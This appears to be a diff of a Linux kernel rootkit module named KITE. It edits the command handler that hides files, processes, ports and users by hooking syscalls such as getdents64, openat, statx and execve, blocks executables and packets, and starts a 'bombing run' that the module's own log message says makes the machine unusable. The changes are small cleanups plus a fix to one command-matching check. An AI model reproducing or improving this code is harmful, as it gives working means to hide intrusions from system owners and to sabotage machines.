@@ -72,7 +72,6 @@ ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 		pr_err("Kernel -> userspace copy failed!\n");
 #endif
-
         return -1; // return error
     }
     return strlen(last_data); // return length of data that was copied
@@ -86,7 +85,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 		pr_err("Userspace -> kernel copy failed!\n");
 #endif
-
         return -1;
     }
 
@@ -98,7 +96,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Added File To Hide: %s\n", last_data);
 #endif
-
             print_list(&files_to_hide);
         }
     }
@@ -109,7 +106,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Added PID To Hide: %s\n", last_data);
 #endif
-
             print_list(&pids_to_hide);
         }
     }
@@ -120,7 +116,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Added Ports To Hide: %s\n", last_data);
 #endif
-
             print_list(&ports_to_hide);
         }
     }
@@ -131,7 +126,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
             pr_info("Added Users To Hide: %s\n", last_data);
 #endif
-
             print_list(&users_to_hide);
         }
     }
@@ -142,7 +136,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
             pr_info("Added Ports To Drop: %s\n", last_data);
 #endif
-
             print_list(&ports_to_drop);
         }
     }
@@ -153,7 +146,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Added Executables To Block: %s\n", last_data);
 #endif
-
             print_list(&exec_to_block);
         }
     }
@@ -164,7 +156,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Remove File Hiding: %s\n", last_data);
 #endif
-
             print_list(&files_to_hide);
         }
     }
@@ -175,7 +166,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Remove PID Hiding: %s\n", last_data);
 #endif
-
             print_list(&pids_to_hide);
         }
     }
@@ -186,7 +176,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Remove Port Hiding: %s\n", last_data);
 #endif
-
             print_list(&ports_to_hide);
         }
     }
@@ -197,7 +186,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Remove File Hiding: %s\n", last_data);
 #endif
-
             print_list(&files_to_hide);
         }
     }
@@ -208,7 +196,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Remove Port Drop: %s\n", last_data);
 #endif
-
             print_list(&files_to_hide);
         }
     }
@@ -219,55 +206,47 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Remove Exec Blocking: %s\n", last_data);
 #endif
-
             print_list(&exec_to_block);
         }
     }
 
     #ifdef PTREGS_SYSCALL_STUB
-    if(memcmp("hide-files-users", tmpdata, strlen("hide-files")) == 0){
-        if(strlen(tmpdata) == strlen("hide-files")){
+    if(memcmp("hide-files-users", tmpdata, strlen("hide-files-users")) == 0){
+        if(strlen(tmpdata) == strlen("hide-files-users")){
             strcpy(last_data, tmpdata);
 #ifdef KITE_DEBUG
 			pr_info("Hiding Files: %s\n", last_data);
 #endif
-
             print_list(&files_to_hide);
             
 #ifdef KITE_DEBUG
 			pr_info("Hiding Users: %s\n", last_data);
 #endif
-
             print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall %d\n", __NR_getdents64);
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall %d\n", __NR_getdents);
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_openat") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall openat\n");
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_pread64") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall openat\n");
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_statx") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall statx\n");
 #endif
-
             }
         }
     }
@@ -279,7 +258,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall %d\n", __NR_reboot);
 #endif
-
             }
         }
     }
@@ -302,7 +280,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Blocking Files: %s\n", last_data);
 #endif
-
             print_list(&exec_to_block);
 
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
@@ -313,8 +290,8 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
     #else
-    if(memcmp("hide-files-users", tmpdata, strlen("hide-files")) == 0){
-        if(strlen(tmpdata) == strlen("hide-files")){
+    if(memcmp("hide-files-users", tmpdata, strlen("hide-files-users")) == 0){
+        if(strlen(tmpdata) == strlen("hide-files-users")){
             strcpy(last_data, tmpdata);
 #ifdef KITE_DEBUG
 			pr_info("Hiding Files: %s\n", last_data);
@@ -333,25 +310,21 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall %d\n", __NR_getdents);
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_openat") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall openat\n");
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_pread64") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall openat\n");
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall statx\n");
 #endif
-
             }
         }
     }
@@ -363,7 +336,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 				pr_err("error hooking syscall %d\n", __NR_reboot);
 #endif
-
             }
         }
     }
@@ -386,14 +358,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Blocking Files & Reboot: %s\n", last_data);
 #endif
-
             print_list(&exec_to_block);
 
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
 #ifdef KITE_DEBUG
 			    pr_err("error hooking syscall execve\n");
 #endif
-
             }
         }
     }
@@ -405,7 +375,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Hiding Ports: %s\n", last_data);
 #endif
-
             print_list(&ports_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
 #ifdef KITE_DEBUG
@@ -421,7 +390,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 				pr_err("error hooking udp4_seq_show\n");
 #endif
-
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
 #ifdef KITE_DEBUG
@@ -496,7 +464,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Blocking Packets");
 #endif
-
             switch_net_hook();
         }
     }
@@ -507,7 +474,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 			pr_info("Machine Will Be Unusable\n");
 #endif
-
             start_bombing_run();
         }
     }
@@ -522,7 +488,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 #ifdef KITE_DEBUG
 	pr_info("User Sent: %s\n", tmpdata);
 #endif
-
     return 0;
 }
 
